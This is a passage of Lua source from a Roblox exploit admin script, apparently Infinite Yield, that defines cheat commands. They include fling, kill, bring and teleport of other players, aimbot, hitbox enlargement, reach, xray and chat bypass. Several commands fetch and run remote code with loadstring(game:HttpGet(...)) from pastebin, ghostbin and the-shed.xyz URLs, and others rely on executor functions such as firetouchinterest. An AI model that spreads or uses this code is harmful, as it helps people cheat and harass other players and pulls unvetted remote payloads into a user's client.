			if v:IsA("Tool") or v:IsA("HopperBin") then
				if v:FindFirstChild("Handle") then
					repeat
						wait()
						if getRoot(speaker.Character) then
							v.Handle.CFrame = getRoot(speaker.Character).CFrame
						end
					until v.Parent == speaker.Character
				end
			end
		end)
	end
	grabtoolsFunc = workspace.ChildAdded:Connect(function(part)
		if part:IsA("Tool") or part:IsA("HopperBin") then
			if part:FindFirstChild("Handle") then
				repeat
					wait()
					if getRoot(speaker.Character) then
						part.Handle.CFrame = getRoot(speaker.Character).CFrame
					end
				until part.Parent == speaker.Character
			end
		end
	end)
	notify('Grabtools','Picking up any floor tools')
end)

addcmd('rf',{'reaper fling'},function(args, speaker)
	loadstring(game:HttpGet("https://pastebin.com/raw/HeviuG4Z"))()
end)

addcmd('light',{},function(args, speaker)
	local light = Instance.new("PointLight")
	light.Parent = getRoot(speaker.Character)
	light.Range = 30
	if args[1] then
		light.Brightness = args[2]
		light.Range = args[1]
	else
		light.Brightness = 5
	end
end)

addcmd('unlight',{'nolight'},function(args, speaker)
	for i,v in pairs(speaker.Character:GetDescendants()) do
		if v.ClassName == "PointLight" then
			v:Destroy()
		end
	end
end)

addcmd('copytools',{},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		spawn(function()
			for i,v in pairs(Players[v]:FindFirstChildOfClass("Backpack"):GetChildren()) do
				if v:IsA('Tool') or v:IsA('HopperBin') then
					v:Clone().Parent = speaker:FindFirstChildOfClass("Backpack")
				end
			end
		end)
	end
end)

addcmd('naked',{},function(args, speaker)
	for i,v in pairs(speaker.Character:GetDescendants()) do
		if v:IsA("Clothing") or v:IsA("ShirtGraphic") then
			v:Destroy()
		end
	end
end)

addcmd('noface',{'removeface'},function(args, speaker)
	for i,v in pairs(speaker.Character:GetDescendants()) do
		if v:IsA("Decal") and v.Name == 'face' then
			v:Destroy()
		end
	end
end)

addcmd('spawnpoint',{'spawn'},function(args, speaker)
	spawnpos = getRoot(speaker.Character).CFrame
	spawnpoint = true
	spDelay = tonumber(args[1]) or 0.1
	notify('Spawn Point','Spawn point created at '..tostring(spawnpos))
end)

addcmd('nospawnpoint',{'nospawn','removespawnpoint'},function(args, speaker)
	spawnpoint = false
	notify('Spawn Point','Removed spawn point')
end)

addcmd('flashback',{'diedtp'},function(args, speaker)
	if lastDeath ~= nil then
		if speaker.Character:FindFirstChild("Humanoid") then
			speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
		end
		wait()
		getRoot(speaker.Character).CFrame = lastDeath
	end
end)

addcmd('hatspin',{'spinhats'},function(args, speaker)
	execCmd('unhatspin')
	wait(.5)
	for _,v in pairs(speaker.Character.Humanoid:GetAccessories()) do
		local keep = Instance.new("BodyPosition") keep.Name = randomString() keep.Parent = v.Handle
		local spin = Instance.new("BodyAngularVelocity") spin.Name = randomString() spin.Parent = v.Handle
		v.Handle:FindFirstChildOfClass("Weld"):Destroy()
		if args[1] then
			spin.AngularVelocity = Vector3.new(0, args[1], 0)
			spin.MaxTorque = Vector3.new(0, args[1] * 2, 0)
		else
			spin.AngularVelocity = Vector3.new(0, 100, 0)
			spin.MaxTorque = Vector3.new(0, 200, 0)
		end
		keep.P = 30000
		keep.D = 50
		spinhats = game:GetService('RunService').Stepped:Connect(function()
			pcall(function()
				keep.Position = Players.LocalPlayer.Character.Head.Position
			end)
		end)
	end
end)

addcmd('unhatspin',{'unspinhats'},function(args, speaker)
	if spinhats then
		spinhats:Disconnect()
	end
	for _,v in pairs(speaker.Character.Humanoid:GetAccessories()) do
		v.Parent = workspace
		for i,c in pairs(v.Handle) do
			if c:IsA("BodyPosition") or c:IsA("BodyAngularVelocity") then
				c:Destroy()
			end
		end
		wait()
		v.Parent = speaker.Character
	end
end)

addcmd('clearhats',{'cleanhats'},function(args, speaker)
	if firetouchinterest then
		local Player = Players.LocalPlayer
		local Character = Player.Character
		local Old = Character:FindFirstChild("HumanoidRootPart").CFrame
		local Hats = {}
		for _,x in next, workspace:GetChildren() do
			if x:IsA("Accessory") then
				table.insert(Hats,x)
			end
		end
		for _,getacc in next, Character:FindFirstChild("Humanoid"):GetAccessories() do
			getacc:Destroy()
		end
		for i = 1,#Hats do
			repeat game:GetService("RunService").Heartbeat:wait() until Hats[i]
			firetouchinterest(Hats[i].Handle,Character:FindFirstChild("HumanoidRootPart"),0)
			repeat game:GetService("RunService").Heartbeat:wait() until Character:FindFirstChildOfClass("Accessory")
			Character:FindFirstChildOfClass("Accessory"):Destroy()
			repeat game:GetService("RunService").Heartbeat:wait() until not Character:FindFirstChildOfClass("Accessory")
		end
		Character:BreakJoints()
		Player.CharacterAdded:wait()
		for i = 1,20 do game:GetService("RunService").Heartbeat:wait()
			if Player.Character:FindFirstChild("HumanoidRootPart") then
				Player.Character:FindFirstChild("HumanoidRootPart").CFrame = Old
			end
		end
	else
		notify('Incompatible Exploit','Your exploit does not support this command (missing firetouchinterest)')
	end
end)


addcmd('vr',{},function(args, speaker)
	-- Full credit to Abacaxl @V3rmillion
	-- Free for all thanks to Zinnia
	loadstring(game:HttpGet('https://ghostbin.co/paste/yb288/raw'))()
end)

addcmd('split',{},function(args, speaker)
	if r15(speaker) then
		speaker.Character.UpperTorso.Waist:Destroy()
	else
		notify('R15 Required','This command requires the r15 rig type')
	end
end)

addcmd('nilchar',{},function(args, speaker)
	if speaker.Character ~= nil then
		speaker.Character.Parent = nil
	end
end)

addcmd('unnilchar',{'nonilchar'},function(args, speaker)
	if speaker.Character ~= nil then
		speaker.Character.Parent = workspace
	end
end)

addcmd('knife',{'shank'},function(args, speaker)
	loadstring(game:HttpGet("https://pastebin.com/raw/rkL55APz"))()
end)

addcmd('replaceroot',{'replacerootpart'},function(args, speaker)
	if speaker.Character ~= nil and speaker.Character:FindFirstChild("HumanoidRootPart") then
		local Char = speaker.Character
		local OldParent = Char.Parent
		local HRP = Char and Char:FindFirstChild("HumanoidRootPart")
		local OldPos = HRP.CFrame
		Char.Parent = game
		local HRP1 = HRP:Clone()
		HRP1.Parent = Char
		HRP = HRP:Destroy()
		HRP1.CFrame = OldPos
		Char.Parent = OldParent
	end
end)

addcmd('clearcharappearance',{'clearchar','clrchar'},function(args, speaker)
	speaker:ClearCharacterAppearance()
end)

addcmd('equiptools',{},function(args, speaker)
	for i,v in pairs(speaker:FindFirstChildOfClass("Backpack"):GetChildren()) do
		if v:IsA("Tool") or v:IsA("HopperBin") then
			v.Parent = speaker.Character
		end
	end
end)

addcmd('touchinterests', {'touchinterest', 'firetouchinterests', 'firetouchinterest'}, function(args, speaker)
	local Root = getRoot(speaker.Character) or speaker.Character:FindFirstChildWhichIsA("BasePart")
	local function Touch(x)
		x = x.FindFirstAncestorWhichIsA(x, "Part")
		if x then
			if firetouchinterest then
				return spawn(function()
					firetouchinterest(x, Root, 1, wait() and firetouchinterest(x, Root, 0))
				end)
			end
			x.CFrame = Root.CFrame
		end
	end
	for _, v in ipairs(workspace:GetDescendants()) do
		if v.IsA(v, "TouchTransmitter") then
			Touch(v)
		end
	end
end)

addcmd('fullbright',{'fb','fullbrightness'},function(args, speaker)
	game:GetService("Lighting").Brightness = 2
	game:GetService("Lighting").ClockTime = 14
	game:GetService("Lighting").FogEnd = 100000
	game:GetService("Lighting").GlobalShadows = false
	game:GetService("Lighting").OutdoorAmbient = Color3.fromRGB(128, 128, 128)
end)

addcmd('loopfullbright',{'loopfb'},function(args, speaker)
	if brightLoop then
		brightLoop:Disconnect()
	end
	local function brightFunc()
		game:GetService("Lighting").Brightness = 2
		game:GetService("Lighting").ClockTime = 14
		game:GetService("Lighting").FogEnd = 100000
		game:GetService("Lighting").GlobalShadows = false
		game:GetService("Lighting").OutdoorAmbient = Color3.fromRGB(128, 128, 128)
	end

	brightLoop = game:GetService("RunService").RenderStepped:Connect(brightFunc)
end)

addcmd('unloopfullbright',{'unloopfb'},function(args, speaker)
	if brightLoop then
		brightLoop:Disconnect()
	end
end)

addcmd('ambient',{},function(args, speaker)
	game:GetService("Lighting").Ambient = Color3.new(args[1],args[2],args[3])
	game:GetService("Lighting").OutdoorAmbient = Color3.new(args[1],args[2],args[3])
end)

addcmd('day',{},function(args, speaker)
	game:GetService("Lighting").ClockTime = 14
end)

addcmd('night',{},function(args, speaker)
	game:GetService("Lighting").ClockTime = 0
end)

addcmd('nofog',{},function(args, speaker)
	game:GetService("Lighting").FogEnd = 100000
end)

addcmd('brightness',{},function(args, speaker)
	game:GetService("Lighting").Brightness = args[1]
end)

addcmd('globalshadows',{'gshadows'},function(args, speaker)
	game:GetService("Lighting").GlobalShadows = true
end)

addcmd('unglobalshadows',{'nogshadows','ungshadows','noglobalshadows'},function(args, speaker)
	game:GetService("Lighting").GlobalShadows = false
end)

origsettings = {abt = game:GetService("Lighting").Ambient, oabt = game:GetService("Lighting").OutdoorAmbient, brt = game:GetService("Lighting").Brightness, time = game:GetService("Lighting").ClockTime, fe = game:GetService("Lighting").FogEnd, fs = game:GetService("Lighting").FogStart, gs = game:GetService("Lighting").GlobalShadows}

addcmd('restorelighting',{'rlighting'},function(args, speaker)
	game:GetService("Lighting").Ambient = origsettings.abt
	game:GetService("Lighting").OutdoorAmbient = origsettings.oabt
	game:GetService("Lighting").Brightness = origsettings.brt
	game:GetService("Lighting").ClockTime = origsettings.time
	game:GetService("Lighting").FogEnd = origsettings.fe
	game:GetService("Lighting").FogStart = origsettings.fs
	game:GetService("Lighting").GlobalShadows = origsettings.gs
end)

addcmd('sh',{'sushihub'},function(args, speaker)
	loadstring(game:HttpGet("https://pastebin.com/raw/XjQRycWH"))()
end)

addcmd('aimbot2',{'ae2'},function(args, speaker)
	loadstring(game:HttpGet("https://pastebin.com/raw/4X9nqeTj"))()
end)

addcmd('aimbot',{'ae'},function(args, speaker)
	loadstring(game:HttpGet("https://pastebin.com/raw/5j6MbR0Y"))()
end)

addcmd('chatbypass',{'cb'},function(args, speaker)
	loadstring(game:HttpGet("https://the-shed.xyz/roblox/scripts/ChatBypass", true))()
end)

addcmd('enablestate',{},function(args, speaker)
	local x = args[1]
	if not tonumber(x) then
		local x = Enum.HumanoidStateType[args[1]]
	end
	speaker.Character:FindFirstChildOfClass("Humanoid"):SetStateEnabled(x, true)
end)

addcmd('disablestate',{},function(args, speaker)
	local x = args[1]
	if not tonumber(x) then
		local x = Enum.HumanoidStateType[args[1]]
	end
	speaker.Character:FindFirstChildOfClass("Humanoid"):SetStateEnabled(x, false)
end)

addcmd('drophats',{'drophat'},function(args, speaker)
	if speaker.Character then
		for _,v in pairs(speaker.Character.Humanoid:GetAccessories()) do
			v.Parent = workspace
		end
	end
end)

addcmd('deletehats',{'nohats','rhats'},function(args, speaker)
	if speaker.Character then
		speaker.Character:FindFirstChildOfClass("Humanoid"):RemoveAccessories()
	end
end)

addcmd('droptools',{'droptool'},function(args, speaker)
	if speaker.Character then
		for _,obj in pairs(speaker.Character:GetChildren()) do
			if obj:IsA("Tool") then
				obj.Parent = workspace
			end
		end
	end
	if speaker:FindFirstChildOfClass("Backpack") then
		for _,obj in pairs(speaker:FindFirstChildOfClass("Backpack"):GetChildren()) do
			if obj:IsA("Tool") then
				obj.Parent = workspace
			end
		end
	end
end)

addcmd('droppabletools',{},function(args, speaker)
	if speaker.Character then
		for _,obj in pairs(speaker.Character:GetChildren()) do
			if obj:IsA("Tool") then
				obj.CanBeDropped = true
			end
		end
	end
	if speaker:FindFirstChildOfClass("Backpack") then
		for _,obj in pairs(speaker:FindFirstChildOfClass("Backpack"):GetChildren()) do
			if obj:IsA("Tool") then
				obj.CanBeDropped = true
			end
		end
	end
end)

local currentToolSize = ""
local currentGripPos = ""
addcmd('reach',{},function(args, speaker)
	execCmd('unreach')
	wait()
	for i,v in pairs(speaker.Character:GetDescendants()) do
		if v:IsA("Tool") then
			if args[1] then
				currentToolSize = v.Handle.Size
				currentGripPos = v.GripPos
				local a = Instance.new("SelectionBox")
				a.Name = "SelectionBoxCreated"
				a.Parent = v.Handle
				a.Adornee = v.Handle
				v.Handle.Massless = true
				v.Handle.Size = Vector3.new(0.5,0.5,args[1])
				v.GripPos = Vector3.new(0,0,0)
				speaker.Character.Humanoid:UnequipTools()
			else
				currentToolSize = v.Handle.Size
				currentGripPos = v.GripPos
				local a = Instance.new("SelectionBox")
				a.Name = "SelectionBoxCreated"
				a.Parent = v.Handle
				a.Adornee = v.Handle
				v.Handle.Massless = true
				v.Handle.Size = Vector3.new(0.5,0.5,60)
				v.GripPos = Vector3.new(0,0,0)
				speaker.Character.Humanoid:UnequipTools()
			end
		end
	end
end)

addcmd('unreach',{'noreach'},function(args, speaker)
	for i,v in pairs(speaker.Character:GetDescendants()) do
		if v:IsA("Tool") then
			v.Handle.Size = currentToolSize
			v.GripPos = currentGripPos
			v.Handle.SelectionBoxCreated:Destroy()
		end
	end
end)

addcmd('grippos',{},function(args, speaker)
	for i,v in pairs(speaker.Character:GetDescendants()) do
		if v:IsA("Tool") then
			v.Parent = speaker:FindFirstChildOfClass("Backpack")
			v.GripPos = Vector3.new(args[1],args[2],args[3])
			v.Parent = speaker.Character
		end
	end
end)

addcmd('usetools',{},function(args, speaker)
	for _, v in pairs(speaker:FindFirstChildOfClass("Backpack"):GetChildren()) do
		v.Parent = game.Players.LocalPlayer.Character
		v:Activate()
		v.Parent = speaker:FindFirstChildOfClass("Backpack")
	end
end)

addcmd('logs',{},function(args, speaker)
	logs:TweenPosition(UDim2.new(0, 0, 1, -265), "InOut", "Quart", 0.3, true, nil)
end)

addcmd('chatlogs',{'clogs'},function(args, speaker)
	join.Visible = false
	chat.Visible = true
	table.remove(shade3,table.find(shade3,selectChat))
	table.remove(shade2,table.find(shade2,selectJoin))
	table.insert(shade2,selectChat)
	table.insert(shade3,selectJoin)
	selectJoin.BackgroundColor3 = currentShade3
	selectChat.BackgroundColor3 = currentShade2
	logs:TweenPosition(UDim2.new(0, 0, 1, -265), "InOut", "Quart", 0.3, true, nil)
end)

addcmd('joinlogs',{'jlogs'},function(args, speaker)
	chat.Visible = false
	join.Visible = true	
	table.remove(shade3,table.find(shade3,selectJoin))
	table.remove(shade2,table.find(shade2,selectChat))
	table.insert(shade2,selectJoin)
	table.insert(shade3,selectChat)
	selectChat.BackgroundColor3 = currentShade3
	selectJoin.BackgroundColor3 = currentShade2
	logs:TweenPosition(UDim2.new(0, 0, 1, -265), "InOut", "Quart", 0.3, true, nil)
end)

flinging = false
addcmd('fling',{},function(args, speaker)
	for _, child in pairs(speaker.Character:GetDescendants()) do
		if child:IsA("BasePart") then
			child.CustomPhysicalProperties = PhysicalProperties.new(2, 0.3, 0.5)
		end
	end
	execCmd('noclip nonotify')
	wait(.1)
	local bambam = Instance.new("BodyAngularVelocity")
	bambam.Name = randomString()
	bambam.Parent = getRoot(speaker.Character)
	bambam.AngularVelocity = Vector3.new(0,311111,0)
	bambam.MaxTorque = Vector3.new(0,311111,0)
	bambam.P = math.huge
	local function PauseFling()
		if speaker.Character:FindFirstChildOfClass("Humanoid") then
			if speaker.Character:FindFirstChildOfClass("Humanoid").FloorMaterial == Enum.Material.Air then
				bambam.AngularVelocity = Vector3.new(0,0,0)
			else
				bambam.AngularVelocity = Vector3.new(0,311111,0)
			end
		end
	end
	if TouchingFloor then
		TouchingFloor:Disconnect()
	end
	if TouchingFloorReset then
		TouchingFloorReset:Disconnect()
	end
	TouchingFloor = speaker.Character:FindFirstChildOfClass("Humanoid"):GetPropertyChangedSignal("FloorMaterial"):Connect(PauseFling)
	flinging = true
	local function flingDied()
		execCmd('unfling')
	end
	TouchingFloorReset = speaker.Character:FindFirstChildOfClass('Humanoid').Died:Connect(flingDied)
end)

addcmd('unfling',{'nofling'},function(args, speaker)
	execCmd('clip nonotify')
	if TouchingFloor then
		TouchingFloor:Disconnect()
	end
	if TouchingFloorReset then
		TouchingFloorReset:Disconnect()
	end
	flinging = false
	wait(.1)
	local speakerChar = speaker.Character
	if not speakerChar or not getRoot(speakerChar) then return end
	for i,v in pairs(getRoot(speakerChar):GetChildren()) do
		if v.ClassName == 'BodyAngularVelocity' then
			v:Destroy()
		end
	end
	for _, child in pairs(speakerChar:GetDescendants()) do
		if child.ClassName == "Part" or child.ClassName == "MeshPart" then
			child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
		end
	end
end)

addcmd('togglefling',{},function(args, speaker)
	if flinging then
		execCmd('unfling')
	else
		execCmd('fling')
	end
end)

addcmd('invisfling',{},function(args, speaker)
	local ch = speaker.Character
	local prt=Instance.new("Model")
	prt.Parent = speaker.Character
	local z1 = Instance.new("Part")
	z1.Name="Torso"
	z1.CanCollide = false
	z1.Anchored = true
	local z2 = Instance.new("Part")
	z2.Name="Head"
	z2.Parent = prt
	z2.Anchored = true
	z2.CanCollide = false
	local z3 =Instance.new("Humanoid")
	z3.Name="Humanoid"
	z3.Parent = prt
	z1.Position = Vector3.new(0,9999,0)
	speaker.Character=prt
	wait(3)
	speaker.Character=ch
	wait(3)
	local Hum = Instance.new("Humanoid")
	z2:Clone()
	Hum.Parent = speaker.Character
	local root =  getRoot(speaker.Character)
	for i,v in pairs(speaker.Character:GetChildren()) do
		if v ~= root and  v.Name ~= "Humanoid" then
			v:Destroy()
		end
	end
	root.Transparency = 0
	root.Color = Color3.new(1, 1, 1)
	local invisflingStepped
	invisflingStepped = game:GetService('RunService').Stepped:Connect(function()
		if speaker.Character and getRoot(speaker.Character) then
			getRoot(speaker.Character).CanCollide = false
		else
			invisflingStepped:Disconnect()
		end
	end)
	sFLY()
	workspace.CurrentCamera.CameraSubject = root
	local bambam = Instance.new("BodyThrust")
	bambam.Parent = getRoot(speaker.Character)
	bambam.Force = Vector3.new(99999,99999*10,99999)
	bambam.Location = getRoot(speaker.Character).Position
end)

function attach(speaker,target)
	if tools(speaker) then
		local char = speaker.Character
		local tchar = target.Character
		local hum = speaker.Character:FindFirstChildOfClass("Humanoid")
		local hrp = getRoot(speaker.Character)
		local hrp2 = getRoot(target.Character)
		hum.Name = "1"
		local newHum = hum:Clone()
		newHum.Parent = char
		newHum.Name = "Humanoid"
		wait()
		hum:Destroy()
		workspace.CurrentCamera.CameraSubject = char
		newHum.DisplayDistanceType = "None"
		local tool = speaker:FindFirstChildOfClass("Backpack"):FindFirstChildOfClass("Tool") or speaker.Character:FindFirstChildOfClass("Tool")
		tool.Parent = char
		hrp.CFrame = hrp2.CFrame * CFrame.new(0, 0, 0) * CFrame.new(math.random(-100, 100)/200,math.random(-100, 100)/200,math.random(-100, 100)/200)
		local n = 0
		repeat
			wait(.1)
			n = n + 1
			hrp.CFrame = hrp2.CFrame
		until (tool.Parent ~= char or not hrp or not hrp2 or not hrp.Parent or not hrp2.Parent or n > 250) and n > 2
	else
		notify('Tool Required','You need to have an item in your inventory to use this command')
	end
end

addcmd('attach',{},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		attach(speaker,Players[v])
	end
end)

function kill(speaker,target,fast)
	if tools(speaker) then
		if target ~= nil then
			local NormPos = getRoot(speaker.Character).CFrame
			if not fast then
				refresh(speaker)
				wait()
				repeat wait() until speaker.Character ~= nil and getRoot(speaker.Character)
				wait(0.3)
			end
			local hrp = getRoot(speaker.Character)
			attach(speaker,target)
			repeat
				wait()
				hrp.CFrame = CFrame.new(999999, workspace.FallenPartsDestroyHeight + 5,999999)
			until not getRoot(target.Character) or not getRoot(speaker.Character)
			wait(1)
			speaker.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame = NormPos
		end
	else
		notify('Tool Required','You need to have an item in your inventory to use this command')
	end
end

addcmd('hammer',{'thor'},function(args, speaker)
	loadstring(game:HttpGet("https://pastebin.com/raw/ZLjGdwgZ"))()
end)

addcmd('handlekill', {'hkill'}, function(args, speaker)
	if not firetouchinterest then
		return notify('Incompatible Exploit', 'Your exploit does not support this command (missing firetouchinterest)')
	end
	local RS = game:GetService("RunService").RenderStepped
	local Tool = speaker.Character.FindFirstChildWhichIsA(speaker.Character, "Tool")
	local Handle = Tool and Tool.FindFirstChild(Tool, "Handle")
	if not Tool or not Handle then
		return notify("Handle Kill", "You need to hold a \"Tool\" that does damage on touch. For example the default \"Sword\" tool.")
	end
	for _, v in ipairs(getPlayer(args[1], speaker)) do
		v = Players[v]
		spawn(function()
			while Tool and speaker.Character and v.Character and Tool.Parent == speaker.Character do
				local Human = v.Character.FindFirstChildWhichIsA(v.Character, "Humanoid")
				if not Human or Human.Health <= 0 then
					break
				end
				for _, v1 in ipairs(v.Character.GetChildren(v.Character)) do
					v1 = ((v1.IsA(v1, "BasePart") and firetouchinterest(Handle, v1, 1, (RS.Wait(RS) and nil) or firetouchinterest(Handle, v1, 0)) and nil) or v1) or v1
				end
			end
			notify("Handle Kill Stopped!", v.Name .. " died/left or you unequiped the tool!")
		end)
	end
end)

addcmd('fastkill',{'fastfekill'},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		kill(speaker,Players[v],true)
	end
end)

function bring(speaker,target,fast)
	if tools(speaker) then
		if target ~= nil then
			local NormPos = getRoot(speaker.Character).CFrame
			if not fast then
				refresh(speaker)
				wait()
				repeat wait() until speaker.Character ~= nil and getRoot(speaker.Character)
				wait(0.3)
			end
			local hrp = getRoot(speaker.Character)
			attach(speaker,target)
			repeat
				wait()
				hrp.CFrame = NormPos
			until not getRoot(target.Character) or not getRoot(speaker.Character)
			wait(1)
			speaker.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame = NormPos
		end
	else
		notify('Tool Required','You need to have an item in your inventory to use this command')
	end
end

addcmd('doo',{'febring'},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		bring(speaker,Players[v])
	end
end)

addcmd('gt',{'bring'},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		bring(speaker,Players[v],true)
	end
end)

function teleport(speaker,target,target2,fast)
	if tools(speaker) then
		if target ~= nil then
			local NormPos = getRoot(speaker.Character).CFrame
			if not fast then
				refresh(speaker)
				wait()
				repeat wait() until speaker.Character ~= nil and getRoot(speaker.Character)
				wait(0.3)
			end
			local hrp = getRoot(speaker.Character)
			local hrp2 = getRoot(target2.Character)
			attach(speaker,target)
			repeat
				wait()
				hrp.CFrame = hrp2.CFrame
			until not getRoot(target.Character) or not getRoot(speaker.Character)
			wait(1)
			speaker.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame = NormPos
		end
	else
		notify('Tool Required','You need to have an item in your inventory to use this command')
	end
end

addcmd('ss',{'ss'},function(args, speaker)
	local players1=getPlayer(args[1], speaker)
	local players2=getPlayer(args[2], speaker)
	for i,v in pairs(players1)do
		if getRoot(Players[v].Character) and getRoot(Players[players2[1]].Character) then
			if speaker.Character:FindFirstChild("Humanoid") then
				speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
			end
			wait(0.1)
			teleport(speaker,Players[v],Players[players2[1]])
		end
	end
end)

addcmd('fasttp',{'fastteleport'},function(args, speaker)
	local players1=getPlayer(args[1], speaker)
	local players2=getPlayer(args[2], speaker)
	for i,v in pairs(players1)do
		if getRoot(Players[v].Character) and getRoot(Players[players2[1]].Character) then
			if speaker.Character:FindFirstChild("Humanoid") then
				speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
			end
			wait(0.1)
			teleport(speaker,Players[v],Players[players2[1]],true)
		end
	end
end)

addcmd('spin',{},function(args, speaker)
	local spinSpeed = 20
	if args[1] and isNumber(args[1]) then
		spinSpeed = args[1]
	end
	for i,v in pairs(getRoot(speaker.Character):GetChildren()) do
		if v.Name == "Spinning" then
			v:Destroy()
		end
	end
	local Spin = Instance.new("BodyAngularVelocity")
	Spin.Name = "Spinning"
	Spin.Parent = getRoot(speaker.Character)
	Spin.MaxTorque = Vector3.new(0, math.huge, 0)
	Spin.AngularVelocity = Vector3.new(0,spinSpeed,0)
end)

addcmd('unspin',{},function(args, speaker)
	for i,v in pairs(getRoot(speaker.Character):GetChildren()) do
		if v.Name == "Spinning" then
			v:Destroy()
		end
	end
end)

local transparent = false
function x(v)
	if v then
		for _,i in pairs(workspace:GetDescendants()) do
			if i:IsA("BasePart") and not i.Parent:FindFirstChild("Humanoid") and not i.Parent.Parent:FindFirstChild("Humanoid") then
				i.LocalTransparencyModifier = 0.5
			end
		end
	else
		for _,i in pairs(workspace:GetDescendants()) do
			if i:IsA("BasePart") and not i.Parent:FindFirstChild("Humanoid") and not i.Parent.Parent:FindFirstChild("Humanoid") then
				i.LocalTransparencyModifier = 0
			end
		end
	end
end

addcmd('xray',{},function(args, speaker)
	transparent = true
	x(transparent)
end)

addcmd('unxray',{'noxray'},function(args, speaker)
	transparent = false
	x(transparent)
end)

addcmd('togglexray',{},function(args, speaker)
	transparent=not transparent
	x(transparent)
end)

local walltpTouch = nil
addcmd('walltp',{},function(args, speaker)
	local torso
	if r15(speaker) then
		torso = speaker.Character.UpperTorso
	else
		torso = speaker.Character.Torso
	end
	local function touchedFunc(hit)
		local Root = getRoot(speaker.Character)
		if hit:IsA("BasePart") and hit.Position.Y > Root.Position.Y - speaker.Character.Humanoid.HipHeight then
			local hitP = getRoot(hit.Parent)
			if hitP ~= nil then
				Root.CFrame = hit.CFrame * CFrame.new(Root.CFrame.lookVector.X,hitP.Size.Z/2 + speaker.Character.Humanoid.HipHeight,Root.CFrame.lookVector.Z)
			elseif hitP == nil then
				Root.CFrame = hit.CFrame * CFrame.new(Root.CFrame.lookVector.X,hit.Size.Y/2 + speaker.Character.Humanoid.HipHeight,Root.CFrame.lookVector.Z)
			end
		end
	end
	walltpTouch = torso.Touched:Connect(touchedFunc)
end)

addcmd('unwalltp',{'nowalltp'},function(args, speaker)
	if walltpTouch then
		walltpTouch:Disconnect()
	end
end)

autoclicking = false
addcmd('autoclick',{},function(args, speaker)
	if mouse1press and mouse1release then
		execCmd('unautoclick')
		wait()
		local clickDelay = 0.1
		local releaseDelay = 0.1
		if args[1] and isNumber(args[1]) then clickDelay = args[1] end
		if args[2] and isNumber(args[2]) then releaseDelay = args[2] end
		autoclicking = true
		cancelAutoClick = UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
			if not gameProcessedEvent then
				if (input.KeyCode == Enum.KeyCode.Backspace and UserInputService:IsKeyDown(Enum.KeyCode.Equals)) or (input.KeyCode == Enum.KeyCode.Equals and UserInputService:IsKeyDown(Enum.KeyCode.Backspace)) then
					autoclicking = false
					cancelAutoClick:Disconnect()
				end
			end
		end)
		notify('Auto Clicker',"Press [backspace] and [=] at the same time to stop")
		repeat wait(clickDelay)
			mouse1press()
			wait(releaseDelay)
			mouse1release()
		until autoclicking == false
	else
		notify('Auto Clicker',"Your exploit doesn't have the ability to use the autoclick")
	end
end)

addcmd('unautoclick',{'noautoclick'},function(args, speaker)
	autoclicking = false
	if cancelAutoClick then cancelAutoClick:Disconnect() end
end)

addcmd('mousesensitivity',{'ms'},function(args, speaker)
	UserInputService.MouseDeltaSensitivity = args[1]
end)

local nameBox = nil
local nbSelection = nil
addcmd('hovername',{},function(args, speaker)
	execCmd('unhovername')
	wait()
	nameBox = Instance.new("TextLabel")
	nameBox.Name = randomString()
	nameBox.Parent = PARENT
	nameBox.BackgroundTransparency = 1
	nameBox.Size = UDim2.new(0,200,0,30)
	nameBox.Font = Enum.Font.Code
	nameBox.TextSize = 16
	nameBox.Text = ""
	nameBox.TextColor3 = Color3.new(1, 1, 1)
	nameBox.TextStrokeTransparency = 0
	nameBox.TextXAlignment = Enum.TextXAlignment.Left
	nameBox.ZIndex = 10
	nbSelection = Instance.new('SelectionBox')
	nbSelection.Name = randomString()
	nbSelection.LineThickness = 0.03
	nbSelection.Color3 = Color3.new(1, 1, 1)
	local function updateNameBox()
		local t
		local target = IYMouse.Target

		if target then
			local humanoid = target.Parent:FindFirstChild('Humanoid') or target.Parent.Parent:FindFirstChild('Humanoid')
			if humanoid then
				t = humanoid.Parent
			end
		end

		if t ~= nil then
			local x = IYMouse.X
			local y = IYMouse.Y
			local xP
			local yP
			if IYMouse.X > 200 then
				xP = x - 205
				nameBox.TextXAlignment = Enum.TextXAlignment.Right
			else
				xP = x + 25
				nameBox.TextXAlignment = Enum.TextXAlignment.Left
			end
			nameBox.Position = UDim2.new(0, xP, 0, y)
			nameBox.Text = t.Name
			nameBox.Visible = true
			nbSelection.Parent = t
			nbSelection.Adornee = t
		else
			nameBox.Visible = false
			nbSelection.Parent = nil
			nbSelection.Adornee = nil
		end
	end
	nbUpdateFunc = IYMouse.Move:Connect(updateNameBox)
end)

addcmd('unhovername',{'nohovername'},function(args, speaker)
	if nbUpdateFunc then
		nbUpdateFunc:Disconnect()
		nameBox:Destroy()
		nbSelection:Destroy()
	end
end)

addcmd('hitbox',{},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		if Players[v]~= speaker and Players[v].Character:FindFirstChild('Head') then
			local sizeArg = tonumber(args[2])
			local Size = Vector3.new(sizeArg,sizeArg,sizeArg)
			local Head = Players[v].Character:FindFirstChild('Head')
			if Head:IsA("BasePart") then
				if not args[2] or sizeArg == 1 then
					Head.Size = Vector3.new(2,1,1)
				else
					Head.Size = Size
				end
			end
		end
	end
end)

addcmd('stareat',{'stare'},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		if stareLoop then
			stareLoop:Disconnect()
		end
		if not Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and Players[v].Character:FindFirstChild("HumanoidRootPart") then return end
		local function stareFunc()
			if Players.LocalPlayer.Character.PrimaryPart and Players:FindFirstChild(v) and Players[v].Character ~= nil and Players[v].Character:FindFirstChild("HumanoidRootPart") then
				local chrPos=Players.LocalPlayer.Character.PrimaryPart.Position
